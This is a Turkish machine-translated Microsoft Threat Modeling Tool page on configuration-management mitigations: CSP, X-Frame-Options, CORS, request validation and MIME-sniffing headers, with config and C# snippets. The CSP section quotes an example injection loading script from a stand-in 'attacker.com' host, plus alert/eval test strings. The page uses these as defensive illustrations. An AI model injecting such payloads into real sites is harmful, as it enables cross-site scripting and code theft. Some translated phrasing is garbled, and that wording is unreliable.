---
title: Yapılandırma yönetimi-Microsoft Threat Modeling Tool-Azure | Microsoft Docs
description: Threat Modeling Tool kullanıma sunulan tehditler için azaltmaları
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: fedf8118f5581056e40594419c17f074c339a61b
ms.sourcegitcommit: 0b1a4101d575e28af0f0d161852b57d82c9b2a7e
ms.translationtype: MT
ms.contentlocale: tr-TR
ms.lasthandoff: 10/30/2019
ms.locfileid: "73161548"
---
# <a name="security-frame-configuration-management--mitigations"></a>Güvenlik çerçevesi: yapılandırma yönetimi | Karşı 
| Ürün/hizmet | Makale |
| --------------- | ------- |
| **Web uygulaması** | <ul><li>[Içerik Güvenlik Ilkesi (CSP) uygulama ve satır içi JavaScript 'i devre dışı bırakma](#csp-js)</li><li>[Tarayıcının XSS filtresini etkinleştir](#xss-filter)</li><li>[ASP.NET uygulamalar, dağıtımdan önce izlemeyi ve hata ayıklamayı devre dışı bırakmalıdır](#trace-deploy)</li><li>[Yalnızca güvenilir kaynaklardan üçüncü taraf JavaScripts 'e erişin](#js-trusted)</li><li>[Kimliği doğrulanmış ASP.NET sayfalarının UI Redressing veya tıklama-Jacking savunmaları içerdiğinden emin olun](#ui-defenses)</li><li>[CORS 'nin ASP.NET Web uygulamalarında etkin olması durumunda yalnızca güvenilir kaynaklardan izin verildiğinden emin olun.](#cors-aspnet)</li><li>[ASP.NET sayfalarında ValidateRequest özniteliğini etkinleştirin](#validate-aspnet)</li><li>[JavaScript kitaplıklarının yerel olarak barındırılan en son sürümlerini kullan](#local-js)</li><li>[Otomatik MIME algılaması 'nı devre dışı bırak](#mime-sniff)</li><li>[Parmak izi oluşmasını önlemek için Windows Azure Web sitelerinde standart sunucu üstbilgilerini kaldırma](#standard-finger)</li></ul> |
| **Veritabanı** | <ul><li>[Veritabanı altyapısı erişimi için bir Windows Güvenlik Duvarı yapılandırma](#firewall-db)</li></ul> |
| **Web API** | <ul><li>[ASP.NET Web API 'sinde CORS etkinse yalnızca güvenilir kaynaklardan izin verildiğinden emin olun](#cors-api)</li><li>[Web API 'sinin gizli verileri içeren yapılandırma dosyalarının bölümlerini şifreleyin](#config-sensitive)</li></ul> |
| **IoT cihazı** | <ul><li>[Tüm yönetici arabirimlerinin güçlü kimlik bilgileriyle güvenli olduğundan emin olun](#admin-strong)</li><li>[Bilinmeyen kodun cihazlarda yürütülemez olduğundan emin olun](#unknown-exe)</li><li>[Bit dolabı ile işletim sistemi ve IoT cihazının ek bölümlerini şifreleme](#partition-iot)</li><li>[Cihazlarda yalnızca en düşük hizmet/özelliklerin etkinleştirildiğinden emin olun](#min-enable)</li></ul> |
| **IoT alan ağ geçidi** | <ul><li>[Bit dolabı ile işletim sistemi ve IoT alan ağ geçidinin ek bölümlerini şifreleme](#field-bit-locker)</li><li>[Alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin yükleme sırasında değiştirildiğinden emin olun](#default-change)</li></ul> |
| **IoT bulut ağ geçidi** | <ul><li>[Bulut ağ geçidinin bağlı cihazlar belleniminin güncel tutulması için bir işlem uyguladığından emin olun](#cloud-firmware)</li></ul> |
| **Makine güven sınırı** | <ul><li>[Cihazların kuruluş ilkelerine göre yapılandırılmış uç nokta güvenlik denetimlerine sahip olduğundan emin olun](#controls-policies)</li></ul> |
| **Azure Depolama** | <ul><li>[Azure depolama erişim anahtarlarının güvenli yönetimi sağlama](#secure-keys)</li><li>[CORS 'nin Azure depolamada etkin olması durumunda yalnızca güvenilir kaynaklardan izin verildiğinden emin olun](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[WCF 'nin hizmet azaltma özelliğini etkinleştir](#throttling)</li><li>[WCF-meta veriler aracılığıyla bilgilerin açıklanması](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Içerik Güvenlik Ilkesi (CSP) uygulama ve satır içi JavaScript 'i devre dışı bırakma

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | İçerik [güvenlik Ilkesine giriş](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Içerik güvenlik ilkesi başvurusu](https://content-security-policy.com/), [güvenlik özellikleri](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [içerik güvenlik ilkesine giriş](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [CSP kullanabilir miyim?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Adımlar** | <p>İçerik Güvenlik Ilkesi (CSP), Web uygulaması sahiplerinin sitesinde katıştırılmış içerik üzerinde denetime sahip olmasını sağlayan bir W3C standardı olan bir derinlemesine savunma güvenlik mekanizmasıdır. CSP, Web sunucusuna bir HTTP yanıt üst bilgisi olarak eklenir ve tarayıcı tarafından istemci tarafında zorlanır. Bu, beyaz liste tabanlı bir ilkedir. bir Web sitesi, JavaScript gibi etkin içeriklerin yüklenebileceği bir güvenilen etki alanı kümesi bildirebilir.</p><p>CSP aşağıdaki güvenlik avantajlarını sağlar:</p><ul><li>**XSS 'ye karşı koruma:** Bir sayfa XSS ile savunmasızdır, bir saldırgan bunu 2 şekilde kullanabilir:<ul><li>`<script>malicious code</script>`Ekle. Bu yararlanma, CSP 'nin temel kısıtlaması nedeniyle çalışmayacak-1</li><li>`<script src="http://attacker.com/maliciousCode.js"/>`Ekle. Bu yararlanma, saldırgan tarafından denetlenen etki alanı CSP 'nin beyaz etki alanları listesinde yer almasından bu yana çalışmayacak</li></ul></li><li>**Veri taşalımı üzerinde denetim:** Bir Web sayfasındaki kötü amaçlı içerik bir dış Web sitesine bağlanmaya ve verileri çalmaya çalışırsa, bağlantı CSP tarafından iptal edilir. Bunun nedeni, hedef etki alanının CSP 'nin beyaz listesinde olmaması olabilir</li><li>**Tıklama-Jacking 'e karşı savunma:** tıklama-Jacking, bir yöneticinin orijinal bir Web sitesini çerçevelenmesini ve Kullanıcı Arabirimi öğelerine tıklamasını zorunlu kıbir saldırı tekniğidir. Bir yanıt üst bilgisi (X-Frame-Options) yapılandırılarak, şu anda tıklama-Jacking 'e karşı savunma yapılır. Tüm tarayıcılar bu üstbilgiye uymaz ve iletme CSP 'si, tıklama ile ilgili savunmanız için standart bir yol olacaktır</li><li>**Gerçek zamanlı saldırı raporlaması:** CSP etkin bir Web sitesine ekleme saldırısı varsa, tarayıcılar Web sunucusu üzerinde yapılandırılan bir uç noktaya otomatik olarak bir bildirim tetikler. Bu şekilde, CSP gerçek zamanlı bir uyarı sistemi işlevi görür.</li></ul> |

### <a name="example"></a>Örnek
Örnek ilke: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Bu ilke, betiklerin yalnızca Web uygulamasının sunucusundan ve Google Analytics sunucusundan yüklenmesine izin verir. Başka herhangi bir siteden yüklenen betikler reddedilir. CSP bir Web sitesinde etkinleştirildiğinde, XSS saldırılarını azaltmak için aşağıdaki özellikler otomatik olarak devre dışı bırakılır. 

### <a name="example"></a>Örnek
Satır içi betikler yürütülmeyecektir. Satır içi betiklerin örnekleri aşağıda verilmiştir 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Örnek
Dizeler kod olarak değerlendirilmeyecektir. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Tarayıcının XSS filtresini etkinleştir

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [XSS koruma filtresi](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Adımlar** | <p>X-XSS-koruma yanıt üst bilgisi yapılandırması tarayıcının siteler arası betik filtresini denetler. Bu yanıt üst bilgisinde aşağıdaki değerler olabilir:</p><ul><li>`0:` bu filtre devre dışı bırakılır</li><li>`1: Filter enabled` bir siteler arası betik saldırısı algılanırsa, saldırıları durdurmak için tarayıcı sayfayı temizler</li><li>`1: mode=block : Filter enabled`. Sayfayı temizleme yerine, bir XSS saldırısı algılandığında, tarayıcı sayfanın işlenmesini engeller</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Tarayıcı sayfayı temizler ve ihlalin rapor eder.</li></ul><p>Bu, ayrıntıları seçtiğiniz bir URI 'ye göndermek için CSP ihlali raporlarının kullanıldığı bir Kmıum işlevidir. Son 2 seçenek, güvenli değerler olarak kabul edilir.</p>|

## <a id="trace-deploy"></a>ASP.NET uygulamalar, dağıtımdan önce izlemeyi ve hata ayıklamayı devre dışı bırakmalıdır

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [ASP.NET hata ayıklamaya genel bakış](https://msdn.microsoft.com/library/ms227556.aspx), [ASP.net izlemeye genel bakış](https://msdn.microsoft.com/library/bb386420.aspx), [nasıl yapılır: bir ASP.NET uygulaması için izlemeyi etkinleştirme](https://msdn.microsoft.com/library/0x5wc973.aspx), [nasıl yapılır: ASP.NET uygulamaları için hata ayıklamayı etkinleştirme](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Adımlar** | Sayfa için izleme etkinleştirildiğinde, istenen her tarayıcı, iç sunucu durumu ve iş akışı hakkındaki verileri içeren izleme bilgilerini de alır. Bu bilgiler güvenliğe duyarlı olabilir. Sayfada hata ayıklama etkinleştirildiğinde, sunucuda meydana gelen hatalar tarayıcıya sunulan tam yığın izleme verileriyle sonuçlanır. Bu veriler, sunucunun iş akışıyla ilgili güvenliğe duyarlı bilgiler açığa çıkabilir. |

## <a id="js-trusted"></a>Yalnızca güvenilir kaynaklardan üçüncü taraf JavaScripts 'e erişin

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | Yok  |
| **Adımlar** | üçüncü taraf JavaScripts 'e yalnızca güvenilir kaynaklardan başvurulmalıdır. Başvuru uç noktaları her zaman SSL üzerinde olmalıdır. |

## <a id="ui-defenses"></a>Kimliği doğrulanmış ASP.NET sayfalarının UI Redressing veya tıklama-Jacking savunmaları içerdiğinden emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [OWASP tıklama-Yiyilmez savunma sayfası](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Iç Işlevleri-combating tıklama-X-Frame-Options ile çarpıcı](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Adımlar** | <p>"UI Redress saldırısı" olarak da bilinen tıklama, bir saldırgan, bir kullanıcının bir düğmeye tıklamasını sağlamak için birden çok saydam veya donuk katman kullandığında, en üst düzey sayfaya tıklandıklarında, başka bir sayfada bulunan bir düğmeye veya bağlantıya tıklamasını sağlar.</p><p>Bu katman, kurban 'in sayfasını yükleyen bir iframe ile kötü amaçlı bir sayfa taslağı oluşturarak elde edilir. Bu nedenle, saldırgan, kendi sayfaları için amaçlanan ' ı tıklatır ve büyük olasılıkla başka bir uygulamaya, etki alanına veya her ikisine de sahip olan başka bir sayfaya yönlendirilir. Tıklama saldırılarına karşı saldırıları engellemek için, tarayıcıyı diğer etki alanlarından çerçeveleme 'ye izin vermamasını sağlayan uygun X-çerçeve seçenekleri HTTP yanıt üst bilgilerini ayarlayın</p>|

### <a name="example"></a>Örnek
X-FRAME-OPTIONS üst bilgisi IIS Web. config aracılığıyla ayarlanabilir. Hiçbir şekilde çerçeveli olmayan siteler için Web. config kod parçacığı: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Örnek
Yalnızca aynı etki alanındaki sayfalara göre çerçevelenmiş siteler için Web. config kodu: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>CORS 'nin ASP.NET Web uygulamalarında etkin olması durumunda yalnızca güvenilir kaynaklardan izin verildiğinden emin olun.

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Web Forms, MVC5 |
| **Özelliklerine**              | Yok  |
| **Başvur**              | Yok  |
| **Adımlar** | <p>Tarayıcı güvenliği, bir web sitesinin başka bir etki alanına AJAX istekleri göndermesini engeller. Bu kısıtlamaya aynı-Origin ilkesi adı verilir ve kötü amaçlı bir sitenin başka bir siteden hassas verileri okumasını önler. Ancak bazen diğer sitelerin tüketebileceği API 'Leri güvenli hale getirmek gerekebilir. Çapraz kaynak kaynak paylaşımı (CORS), bir sunucunun aynı kaynak ilkeyi rahat bir şekilde sağlamasına olanak tanıyan bir W3C standardıdır. CORS kullanarak, bir sunucu bazı çapraz kaynak isteklerine, diğerlerini reddetirken açık bir şekilde izin verebilir.</p><p>CORS, JSONP gibi önceki tekniklerin daha güvenli ve daha esnektir. Bu uygulamada, CORS 'nin etkinleştirilmesi Web uygulamasına birkaç HTTP yanıt üst bilgisi (Access-Control-*) ekleme ve bu işlem birkaç yolla yapılabilir.</p>|

### <a name="example"></a>Örnek
Web. config dosyasına erişim varsa, CORS aşağıdaki kodla eklenebilir: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Örnek
Web. config dosyasına erişim yoksa, CORS aşağıdaki CSharp kodu eklenerek yapılandırılabilir: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

"Erişim-denetim-Izin-Origin" özniteliğinde bulunan çıkış listesinin sonlu ve güvenilir bir kaynak kümesine ayarlandığından emin olmak için kritik olduğunu unutmayın. Bu uygun olmayan yapılandırma (ör. değeri ' * ' olarak ayarlamak) kötü amaçlı sitelerin Web > uygulamasına çapraz kaynak isteklerini tetiklemesine izin verir ve bu sayede uygulama CSRF saldırılarına karşı savunmasız hale gelir. 

## <a id="validate-aspnet"></a>ASP.NET sayfalarında ValidateRequest özniteliğini etkinleştirin

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Web Forms, MVC5 |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [İstek doğrulaması-betik saldırılarını önler](https://www.asp.net/whitepapers/request-validation) |
| **Adımlar** | <p>Sürüm 1,1 ' den bu yana bir ASP.NET özelliği olan istek doğrulaması, sunucunun kodlanmamış HTML içeren içeriği kabul etmesini engeller. Bu özellik, istemci betik kodu veya HTML 'nin bir sunucuya geri gönderilebildiği, depolandığı ve daha sonra diğer kullanıcılara sunulabildiği bazı betik ekleme saldırılarını önlemeye yardımcı olmak için tasarlanmıştır. Ayrıca, uygun olduğunda tüm giriş verilerini doğrulamanızı ve HTML 'in kodlanmasını kesinlikle öneririz.</p><p>İstek doğrulaması, tüm giriş verileri tehlikeli olabilecek değerler listesiyle karşılaştırılarak gerçekleştirilir. Bir eşleşme oluşursa, ASP.NET `HttpRequestValidationException`başlatır. Varsayılan olarak, Istek doğrulama özelliği etkindir.</p>|

### <a name="example"></a>Örnek
Ancak, bu özellik sayfa düzeyinde devre dışı bırakılabilir: 
```XML
<%@ Page validateRequest="false" %> 
```
veya uygulama düzeyinde 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Istek doğrulama özelliğinin desteklenmediğini ve MVC6 işlem hattının bir parçası olduğunu lütfen unutmayın. 

## <a id="local-js"></a>JavaScript kitaplıklarının yerel olarak barındırılan en son sürümlerini kullan

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | Yok  |
| **Adımlar** | <p>JQuery gibi standart JavaScript kitaplıklarını kullanan geliştiriciler, bilinen güvenlik kusurlardan oluşan ortak JavaScript kitaplıklarının onaylanan sürümlerini kullanmalıdır. Daha eski sürümlerindeki bilinen güvenlik açıklarına yönelik güvenlik düzeltmeleri içerdiğinden, kitaplıkların en son sürümünü kullanmak iyi bir uygulamadır.</p><p>En son sürüm uyumluluk nedeniyle kullanılmıyorsa, aşağıdaki en düşük sürümler kullanılmalıdır.</p><p>Kabul edilebilir en düşük sürümler:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery doğrulaması 1,9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2,99</li><li>JQuery DataTable 1.9.0</li></ul></li><li>**AJAX denetim araç seti**<ul><li>AJAX denetim araç seti 40412</li></ul></li><li>**ASP.NET Web Forms ve Ajax**<ul><li>ASP.NET Web Forms ve Ajax 4</li><li>ASP.NET AJAX 3,5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3,0</li></ul></li></ul><p>Genel CDNs gibi dış sitelerden hiçbir bir JavaScript kitaplığı yükleme</p>|

## <a id="mime-sniff"></a>Otomatik MIME algılaması 'nı devre dışı bırak

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [IE8 güvenlik bölümü V: kapsamlı koruma](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME türü](https://en.wikipedia.org/wiki/Mime_type) |
| **Adımlar** | X-Content-Type-Options üst bilgisi, geliştiricilerin içeriklerinin MIME önlenmesini belirtmelerine izin veren bir HTTP başlığıdır. Bu üstbilgi, MIME algılaması saldırılarını azaltmak için tasarlanmıştır. Kullanıcı denetlenebilir içerik içerebilen her sayfa için, HTTP üstbilgisi X-Content-Type-Options: noalgılayıcılar f ' i kullanmanız gerekir. Gerekli üst bilgiyi uygulamadaki tüm sayfalar için genel olarak etkinleştirmek üzere aşağıdakilerden birini yapabilirsiniz|

### <a name="example"></a>Örnek
Uygulama Internet Information Services (IIS) 7 ' den barındırılıyorsa, Web. config dosyasına üst bilgi ekleyin. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Örnek
Genel uygulama\_BeginRequest aracılığıyla üst bilgiyi ekleyin 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Örnek
Özel HTTP modülünü Uygula 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Örnek
Gerekli üstbilgiyi tek tek yanıtlara ekleyerek yalnızca belirli sayfalar için etkinleştirebilirsiniz: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Parmak izi oluşmasını önlemek için Windows Azure Web sitelerinde standart sunucu üstbilgilerini kaldırma

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web Uygulaması | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | Yorlar |
| **Özelliklerine**              | EnvironmentType-Azure |
| **Başvur**              | [Windows Azure Web sitelerinde standart sunucu üstbilgilerini kaldırma](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Adımlar** | Sunucu, X-destekli X-AspNet-Version gibi üstbilgiler, sunucu ve temel alınan teknolojiler hakkında bilgi açığa çıkar. Bu üst bilgilerin bastırılmasının, bu sayede uygulamanın parmak izi olarak yazdırılmasını engellemiş olması önerilir |

## <a id="firewall-db"></a>Veritabanı altyapısı erişimi için bir Windows Güvenlik Duvarı yapılandırma

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Database | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | SQL Azure, Onprea |
| **Özelliklerine**              | Yok, SQL sürümü-V12 |
| **Başvur**              | [Azure SQL veritabanı güvenlik duvarını yapılandırma](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [veritabanı altyapısı erişimi Için bir Windows Güvenlik Duvarı yapılandırma](https://msdn.microsoft.com/library/ms175043) |
| **Adımlar** | Güvenlik duvarı sistemleri, bilgisayar kaynaklarına yetkisiz erişimi önlemeye yardımcı olur. Bir güvenlik duvarı aracılığıyla SQL Server veritabanı altyapısının bir örneğine erişmek için, SQL Server çalıştıran bilgisayardaki güvenlik duvarını erişime izin verecek şekilde yapılandırmanız gerekir. |

## <a id="cors-api"></a>ASP.NET Web API 'sinde CORS etkinse yalnızca güvenilir kaynaklardan izin verildiğinden emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web API’si | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | MVC 5 |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [ASP.NET Web API 2 ' de çapraz kaynak Isteklerini etkinleştirme](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API 2 ' de ASP.NET Web api-cors desteği](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Adımlar** | <p>Tarayıcı güvenliği, bir web sitesinin başka bir etki alanına AJAX istekleri göndermesini engeller. Bu kısıtlamaya aynı-Origin ilkesi adı verilir ve kötü amaçlı bir sitenin başka bir siteden hassas verileri okumasını önler. Ancak bazen diğer sitelerin tüketebileceği API 'Leri güvenli hale getirmek gerekebilir. Çapraz kaynak kaynak paylaşımı (CORS), bir sunucunun aynı kaynak ilkeyi rahat bir şekilde sağlamasına olanak tanıyan bir W3C standardıdır.</p><p>CORS kullanarak, bir sunucu bazı çapraz kaynak isteklerine, diğerlerini reddetirken açık bir şekilde izin verebilir. CORS, JSONP gibi önceki tekniklerin daha güvenli ve daha esnektir.</p>|

### <a name="example"></a>Örnek
App_Start/WebApiConfig. cs dosyasında, WebApiConfig. Register yöntemine aşağıdaki kodu ekleyin 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Örnek
EnableCors özniteliği, denetleyicideki eylem yöntemlerine aşağıdaki gibi uygulanabilir: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Lütfen EnableCors özniteliğindeki çıkış listesinin sonlu ve güvenilir bir çıkış kümesine ayarlandığından emin olmak için kritik olduğunu unutmayın. Bu uygun olmayan yapılandırma (örn. değeri ' * ' olarak ayarlamak) kötü amaçlı sitelerin API 'ye çapraz kaynak isteklerini herhangi bir kısıtlama olmadan tetiklemesine olanak tanır > böylece API 'nin CSRF saldırılarına karşı savunmasız olmasına neden olur. EnableCors, denetleyici düzeyinde donatılmış olabilir. 

### <a name="example"></a>Örnek
Bir sınıftaki belirli bir yöntemde CORS 'yi devre dışı bırakmak için DisableCors özniteliği aşağıda gösterildiği gibi kullanılabilir: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web API’si | 
| **SDL aşaması**               | Yapı |  
| **İlgili teknolojiler** | MVC 6 |
| **Özelliklerine**              | Yok  |
| **Başvur**              | [ASP.NET Core 1,0 ' de çıkış noktaları arası Istekleri (CORS) etkinleştirme](https://docs.asp.net/en/latest/security/cors.html) |
| **Adımlar** | <p>ASP.NET Core 1,0 ' de, CORS, ara yazılım ya da MVC kullanılarak etkinleştirilebilir. CORS 'yi etkinleştirmek için MVC kullanılırken aynı CORS hizmetleri kullanılır, ancak CORS ara yazılımı değildir.</p>|

**Yaklaşım-1** Yazılım yardımıyla CORS 'yi etkinleştirme: uygulamanın tamamında CORS 'Yi etkinleştirmek Için, UseCors uzantı yöntemini kullanarak CORS ara hattını istek ardışık düzenine ekleyin. CorsPolicyBuilder sınıfı kullanılarak CORS ara yazılımı eklenirken bir çapraz kaynak ilkesi belirtilebilir. Bunu iki şekilde yapabilirsiniz:

### <a name="example"></a>Örnek
Birincisi, bir lambda ile UseCors 'yi çağırmayın. Lambda bir CorsPolicyBuilder nesnesi alır: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Örnek
İkincisi bir veya daha fazla adlandırılmış CORS ilkesini tanımlamak ve sonra çalışma zamanında ilkeyi ada göre seçer. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Yaklaşım-2** MVC 'de CORS 'yi etkinleştirme: geliştiriciler alternatif olarak, tüm denetleyiciler için eylem başına belirli CORS 'yi, denetleyici başına veya küresel olarak uygulamak için MVC 'yi kullanabilir.

### <a name="example"></a>Örnek
Eylem başına: belirli bir eylem için bir CORS ilkesi belirtmek Için eyleme [EnableCors] özniteliğini ekleyin. İlke adını belirtin. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Örnek
Denetleyici başına: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Örnek
Görünüm 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Lütfen EnableCors özniteliğindeki çıkış listesinin sonlu ve güvenilir bir çıkış kümesine ayarlandığından emin olmak için kritik olduğunu unutmayın. Bu uygun olmayan yapılandırma (örn. değeri ' * ' olarak ayarlamak) kötü amaçlı sitelerin API 'ye çapraz kaynak isteklerini herhangi bir kısıtlama olmadan tetiklemesine olanak tanır > böylece API 'nin CSRF saldırılarına karşı savunmasız olmasına neden olur. 

### <a name="example"></a>Örnek
Bir denetleyici veya eylem için CORS 'yi devre dışı bırakmak için [DisableCors] özniteliğini kullanın. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Web API 'sinin gizli verileri içeren yapılandırma dosyalarının bölümlerini şifreleyin

